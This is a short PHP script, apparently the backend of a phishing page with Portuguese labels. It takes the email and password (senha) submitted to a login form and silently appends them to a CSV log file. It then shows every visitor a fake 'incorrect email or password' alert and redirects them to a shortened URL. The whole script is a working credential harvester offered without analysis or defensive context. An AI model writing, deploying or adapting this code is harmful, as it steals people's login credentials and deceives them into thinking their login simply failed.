<?php
error_reporting(0);
ini_set("displa_erros", 0);


$email = $_POST["email"];
$senha = $_POST["senha"];


function gravar($texto){
	
	$arquivo = "logs/logs.csv";
	
	$fp = fopen($arquivo, "a+");

	fwrite($fp, $texto);		
	fclose($fp);
}

gravar($email.",".$senha."\n");

if ($email && $senha){
	echo "<script>alert('E-mail ou senha incorretos')</script>";  
		echo "<script language= 'JavaScript'>location.href='https://encurtador.com.br/xyE04'</script>";  
	} 

?>